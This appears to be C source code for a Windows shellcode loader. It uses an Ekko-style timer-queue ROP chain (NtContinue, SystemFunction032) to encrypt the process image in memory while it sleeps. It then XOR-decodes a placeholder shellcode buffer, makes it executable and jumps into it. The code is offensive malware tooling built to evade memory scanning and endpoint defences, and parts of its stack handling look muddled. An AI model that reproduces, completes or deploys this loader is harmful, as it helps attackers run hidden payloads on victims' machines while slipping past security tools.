#include"common.h"

typedef struct {
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;


void xor_encrypt_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}
VOID ropOb(DWORD SleepTime) {

    //shellcode 
    unsigned char mychar[] = "Your shellcode after encrypted";
    size_t size = sizeof(mychar);
    size_t len = sizeof(mychar) - 1;

    unsigned char key = 0xAB; //same key you used before
    
    DWORD shellcodeSize = sizeof(mychar);
    DWORD   OldProtect = 0;

    PVOID ImageBase = GetModuleHandle(NULL);
    DWORD ImageSize = ((PIMAGE_NT_HEADERS)((DWORD64)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)ImageBase;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)ImageBase + DOS_HEADER->e_lfanew);
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);

    LPVOID txtSectionBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)SECTION_HEADER->PointerToRawData);
    DWORD txtSectionSize = SECTION_HEADER->SizeOfRawData;

    LPVOID reapplyBase = NULL;
    DWORD reapplySize = 0;


    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {
        if (!strcmp(".reloc", (const char*)SECTION_HEADER->Name)) {
            reapplyBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)SECTION_HEADER->PointerToRawData);
            reapplySize = SECTION_HEADER->SizeOfRawData;
        }
        SECTION_HEADER++;
    }


    DWORD CryptSize = ImageSize - (DWORD)((DWORD)txtSectionBase - (DWORD)ImageBase)
        - (ImageSize - ((DWORD)reapplyBase - (DWORD)ImageBase)) + reapplySize;


    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopExecuteShellcode = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    HANDLE  hEvent = NULL;

    CHAR KeyBuf[16];
    unsigned int r = 0;
    for (int i = 0; i < 16; i++) {
        rand_s(&r); // r between UINT_MIN & UINT_MAX
        KeyBuf[i] = (CHAR)r;

    }

    USTRING Key = { 0 };
    USTRING Img = { 0 };

    PVOID   NtContinue = NULL;
    PVOID   SysFunc032 = NULL;

    hEvent = CreateEventW(0, 0, 0, 0);
    hTimerQueue = CreateTimerQueue();

    NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");
    SysFunc032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");


    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = txtSectionBase;
    Img.Length = Img.MaximumLength = CryptSize;

    DWORD oldProtect;
    if (!VirtualProtect(mychar, sizeof(mychar), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection\n");
        return;
    }

    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        WaitForSingleObject(hEvent, 0x32);

        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopDelay, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopExecuteShellcode, &CtxThread, sizeof(CONTEXT));

        //VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD64)VirtualProtect;
        RopProtRW.Rcx = (DWORD64)ImageBase;
        RopProtRW.Rdx = ImageSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = (DWORD64)&OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp -= 8;
        RopMemEnc.Rip = (DWORD64)SysFunc032;
        RopMemEnc.Rcx = (DWORD64)&Img;
        RopMemEnc.Rdx = (DWORD64)&Key;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp -= 8;
        RopDelay.Rip = (DWORD64)WaitForSingleObject;
        RopDelay.Rcx = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx = SleepTime;

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp -= 8;
        RopMemDec.Rip = (DWORD64)SysFunc032;
        RopMemDec.Rcx = (DWORD64)&Img;
        RopMemDec.Rdx = (DWORD64)&Key;


        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD64)VirtualProtect;
        RopProtRX.Rcx = (DWORD64)ImageBase;
        RopProtRX.Rdx = ImageSize;
        RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9 = (DWORD64)&OldProtect;

        //shellcode encrypt
        RopExecuteShellcode.Rsp -= 8;
        RopExecuteShellcode.Rip = (DWORD64)xor_encrypt_decrypt;
        unsigned char* shellcode = mychar;
        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)mychar; //shellcode

        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)len; //length

        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)key; //key

        //shellcode decrypt
        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)(RopExecuteShellcode.Rip + 16); 
        RopExecuteShellcode.Rip = (DWORD64)shellcode;


        RopExecuteShellcode.Rsp -= 8;
        RopExecuteShellcode.Rip = (DWORD64)mychar;

        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip = (DWORD64)SetEvent;
        RopSetEvt.Rcx = (DWORD64)hEvent;

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 700, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
        xor_encrypt_decrypt(mychar, len, key);
        ((void(*)())RopExecuteShellcode.Rip)();
    }
    // delete the timerQueue
    DeleteTimerQueue(hTimerQueue);
}

